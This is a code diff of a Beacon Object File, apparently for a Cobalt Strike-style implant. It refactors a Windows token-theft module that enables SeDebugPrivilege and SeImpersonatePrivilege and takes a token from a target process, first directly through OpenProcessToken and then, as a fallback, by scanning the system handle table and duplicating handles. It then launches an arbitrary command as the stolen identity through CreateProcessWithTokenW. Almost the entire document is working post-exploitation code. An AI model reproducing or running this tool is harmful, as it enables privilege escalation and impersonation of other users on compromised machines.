@@ -1,9 +1,13 @@
 /*
  * impersonate_bof.c
  *
- * BOF version of impersonate.c -- steals a token from a target PID via
- * handle enumeration (NtQuerySystemInformation + DuplicateHandle) and
+ * BOF version of impersonate.c -- steals a token from a target PID and
  * launches a specified command as the stolen identity.
+ *
+ * Token acquisition strategy:
+ *   1. OpenProcessToken with TOKEN_DUPLICATE (direct)
+ *   2. Fallback: OpenProcess(PROCESS_DUP_HANDLE) + system handle table
+ *      scan via NtQuerySystemInformation
  *
  * Arguments (packed via bof_pack):
  *   int     target_pid  - PID to steal token from
@@ -39,7 +43,6 @@ typedef struct {
 
 /* ── DFR declarations ──────────────────────────────────────────────── */
 
-/* kernel32 */
 DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
 DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
 DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
@@ -50,7 +53,6 @@ DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
 DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);
 DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
 
-/* advapi32 */
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
@@ -63,13 +65,11 @@ DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid(PSID);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CopySid(DWORD, PSID, PSID);
 DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE, DWORD, LPCWSTR, LPWSTR, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 
-/* msvcrt */
 DECLSPEC_IMPORT void  *MSVCRT$malloc(size_t);
 DECLSPEC_IMPORT void  *MSVCRT$realloc(void*, size_t);
 DECLSPEC_IMPORT void   MSVCRT$free(void*);
 DECLSPEC_IMPORT void  *MSVCRT$memset(void*, int, size_t);
 
-/* ntdll - resolved at runtime */
 typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
 
 /* ── helpers ───────────────────────────────────────────────────────── */
@@ -90,12 +90,6 @@ static void enable_priv(const char *priv_name) {
     KERNEL32$CloseHandle(tok);
 }
 
-static BOOL is_token_handle(HANDLE h) {
-    TOKEN_TYPE tt;
-    DWORD len;
-    return ADVAPI32$GetTokenInformation(h, TokenType, &tt, sizeof(tt), &len);
-}
-
 static PSID get_token_user_sid(HANDLE tok) {
     DWORD len = 0;
     ADVAPI32$GetTokenInformation(tok, TokenUser, NULL, 0, &len);
@@ -110,6 +104,107 @@ static PSID get_token_user_sid(HANDLE tok) {
     }
     MSVCRT$free(tu);
     return copy;
+}
+
+/* ── Token acquisition strategies ──────────────────────────────────── */
+
+/* Strategy 1: direct OpenProcessToken */
+static HANDLE try_direct(DWORD pid, PSID our_sid) {
+    HANDLE proc = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!proc) return NULL;
+
+    HANDLE tok = NULL;
+    if (!ADVAPI32$OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
+        KERNEL32$CloseHandle(proc);
+        return NULL;
+    }
+
+    /* Skip if same user */
+    if (our_sid) {
+        PSID tok_sid = get_token_user_sid(tok);
+        if (tok_sid && ADVAPI32$EqualSid(tok_sid, our_sid)) {
+            MSVCRT$free(tok_sid);
+            KERNEL32$CloseHandle(tok);
+            KERNEL32$CloseHandle(proc);
+            return NULL;
+        }
+        MSVCRT$free(tok_sid);
+    }
+
+    HANDLE primary = NULL;
+    ADVAPI32$DuplicateTokenEx(tok, MAXIMUM_ALLOWED, NULL,
+                              SecurityImpersonation, TokenPrimary, &primary);
+    KERNEL32$CloseHandle(tok);
+    KERNEL32$CloseHandle(proc);
+    return primary;
+}
+
+/* Strategy 2: handle table scan */
+static HANDLE try_handle_scan(DWORD pid, PSID our_sid,
+                              NtQuerySystemInformation_t pNtQSI) {
+    if (!pNtQSI) return NULL;
+
+    HANDLE proc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
+    if (!proc) return NULL;
+
+    ULONG bufsize = 1024 * 1024;
+    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    NTSTATUS status;
+    do {
+        shi = MSVCRT$realloc(shi, bufsize);
+        if (!shi) { KERNEL32$CloseHandle(proc); return NULL; }
+        status = pNtQSI(SystemHandleInformation, shi, bufsize, NULL);
+        if (status == STATUS_INFO_LENGTH_MISMATCH) bufsize *= 2;
+    } while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+    if (!NT_SUCCESS(status)) {
+        MSVCRT$free(shi);
+        KERNEL32$CloseHandle(proc);
+        return NULL;
+    }
+
+    HANDLE result = NULL;
+    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
+        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
+        if (e->ProcessId != pid) continue;
+
+        HANDLE dup = NULL;
+        if (!KERNEL32$DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
+                KERNEL32$GetCurrentProcess(), &dup,
+                TOKEN_QUERY | TOKEN_DUPLICATE, FALSE, 0))
+            continue;
+
+        TOKEN_TYPE tt;
+        DWORD len;
+        if (!ADVAPI32$GetTokenInformation(dup, TokenType, &tt, sizeof(tt), &len)) {
+            KERNEL32$CloseHandle(dup);
+            continue;
+        }
+
+        /* Skip same user */
+        if (our_sid) {
+            PSID tok_sid = get_token_user_sid(dup);
+            if (tok_sid && ADVAPI32$EqualSid(tok_sid, our_sid)) {
+                MSVCRT$free(tok_sid);
+                KERNEL32$CloseHandle(dup);
+                continue;
+            }
+            MSVCRT$free(tok_sid);
+        }
+
+        HANDLE primary = NULL;
+        if (ADVAPI32$DuplicateTokenEx(dup, MAXIMUM_ALLOWED, NULL,
+                SecurityImpersonation, TokenPrimary, &primary)) {
+            KERNEL32$CloseHandle(dup);
+            result = primary;
+            break;
+        }
+        KERNEL32$CloseHandle(dup);
+    }
+
+    MSVCRT$free(shi);
+    KERNEL32$CloseHandle(proc);
+    return result;
 }
 
 /* ── BOF entry point ───────────────────────────────────────────────── */
@@ -130,47 +225,8 @@ void go(char *args, int len) {
         return;
     }
 
-    /* Resolve NtQuerySystemInformation */
-    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
-    if (!ntdll) { BeaconPrintf(CALLBACK_ERROR, "No ntdll"); return; }
-    NtQuerySystemInformation_t pNtQSI = (NtQuerySystemInformation_t)
-        KERNEL32$GetProcAddress(ntdll, "NtQuerySystemInformation");
-    if (!pNtQSI) { BeaconPrintf(CALLBACK_ERROR, "No NtQuerySystemInformation"); return; }
-
     enable_priv("SeDebugPrivilege");
     enable_priv("SeImpersonatePrivilege");
-
-    /* Open target process */
-    HANDLE proc = KERNEL32$OpenProcess(PROCESS_DUP_HANDLE, FALSE, (DWORD)target_pid);
-    if (!proc) {
-        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) FAILED: %lu",
-                     target_pid, KERNEL32$GetLastError());
-        return;
-    }
-    BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened PID %d", target_pid);
-
-    /* Enumerate system handles */
-    ULONG bufsize = 1024 * 1024;
-    SYSTEM_HANDLE_INFORMATION *shi = NULL;
-    NTSTATUS status;
-    do {
-        shi = MSVCRT$realloc(shi, bufsize);
-        if (!shi) {
-            BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
-            KERNEL32$CloseHandle(proc);
-            return;
-        }
-        status = pNtQSI(SystemHandleInformation, shi, bufsize, NULL);
-        if (status == STATUS_INFO_LENGTH_MISMATCH)
-            bufsize *= 2;
-    } while (status == STATUS_INFO_LENGTH_MISMATCH);
-
-    if (!NT_SUCCESS(status)) {
-        BeaconPrintf(CALLBACK_ERROR, "NtQuerySystemInformation FAILED: 0x%08lx", status);
-        MSVCRT$free(shi);
-        KERNEL32$CloseHandle(proc);
-        return;
-    }
 
     /* Get our own SID to skip matching tokens */
     PSID our_sid = NULL;
@@ -182,77 +238,52 @@ void go(char *args, int len) {
         }
     }
 
-    /* Find a token handle belonging to a different user */
-    HANDLE stolen = NULL;
-    for (ULONG i = 0; i < shi->NumberOfHandles; i++) {
-        SYSTEM_HANDLE_ENTRY *e = &shi->Handles[i];
-        if (e->ProcessId != (ULONG)target_pid)
-            continue;
+    /* Strategy 1: direct OpenProcessToken */
+    HANDLE primary = try_direct((DWORD)target_pid, our_sid);
+    const char *method = "direct";
 
-        HANDLE dup = NULL;
-        if (!KERNEL32$DuplicateHandle(proc, (HANDLE)(ULONG_PTR)e->Handle,
-                KERNEL32$GetCurrentProcess(), &dup,
-                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
-                FALSE, 0))
-            continue;
+    /* Strategy 2: handle table scan fallback */
+    if (!primary) {
+        HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
+        NtQuerySystemInformation_t pNtQSI = NULL;
+        if (ntdll)
+            pNtQSI = (NtQuerySystemInformation_t)
+                KERNEL32$GetProcAddress(ntdll, "NtQuerySystemInformation");
+        primary = try_handle_scan((DWORD)target_pid, our_sid, pNtQSI);
+        method = "handle scan";
+    }
 
-        if (!is_token_handle(dup)) {
-            KERNEL32$CloseHandle(dup);
-            continue;
-        }
+    MSVCRT$free(our_sid);
 
-        PSID tok_sid = get_token_user_sid(dup);
-        if (tok_sid && our_sid && ADVAPI32$EqualSid(tok_sid, our_sid)) {
-            MSVCRT$free(tok_sid);
-            KERNEL32$CloseHandle(dup);
-            continue;
-        }
+    if (!primary) {
+        BeaconPrintf(CALLBACK_ERROR, "No usable token found in PID %d", target_pid);
+        return;
+    }
 
-        if (tok_sid) {
+    /* Report stolen identity */
+    {
+        PSID sid = get_token_user_sid(primary);
+        if (sid) {
             char name[256] = {0}, domain[256] = {0};
             DWORD nlen = sizeof(name), dlen = sizeof(domain);
             SID_NAME_USE use;
-            ADVAPI32$LookupAccountSidA(NULL, tok_sid, name, &nlen, domain, &dlen, &use);
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Stolen token: %s\\%s (handle 0x%x)",
-                         domain, name, e->Handle);
-            MSVCRT$free(tok_sid);
+            ADVAPI32$LookupAccountSidA(NULL, sid, name, &nlen, domain, &dlen, &use);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Stolen token: %s\\%s [%s]",
+                         domain, name, method);
+            MSVCRT$free(sid);
         }
-        stolen = dup;
-        break;
     }
 
-    MSVCRT$free(shi);
-    MSVCRT$free(our_sid);
-
-    if (!stolen) {
-        BeaconPrintf(CALLBACK_ERROR, "No usable token found in PID %d", target_pid);
-        KERNEL32$CloseHandle(proc);
-        return;
-    }
-
-    /* Duplicate as primary token for CreateProcessWithTokenW */
-    HANDLE primary = NULL;
-    if (!ADVAPI32$DuplicateTokenEx(stolen, MAXIMUM_ALLOWED, NULL,
-            SecurityImpersonation, TokenPrimary, &primary)) {
-        BeaconPrintf(CALLBACK_ERROR, "DuplicateTokenEx FAILED: %lu", KERNEL32$GetLastError());
-        KERNEL32$CloseHandle(stolen);
-        KERNEL32$CloseHandle(proc);
-        return;
-    }
-
-    /* Convert command to wide string */
+    /* Convert command to wide string and spawn */
     int wlen = KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
     WCHAR *wcmd = MSVCRT$malloc(wlen * sizeof(WCHAR));
     if (!wcmd) {
         BeaconPrintf(CALLBACK_ERROR, "Allocation failed");
         KERNEL32$CloseHandle(primary);
-        KERNEL32$CloseHandle(stolen);
-        KERNEL32$CloseHandle(proc);
         return;
     }
     KERNEL32$MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);
 
-    /* Launch process under stolen identity */
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     MSVCRT$memset(&si, 0, sizeof(si));
@@ -271,6 +302,4 @@ void go(char *args, int len) {
 
     MSVCRT$free(wcmd);
     KERNEL32$CloseHandle(primary);
-    KERNEL32$CloseHandle(stolen);
-    KERNEL32$CloseHandle(proc);
 }
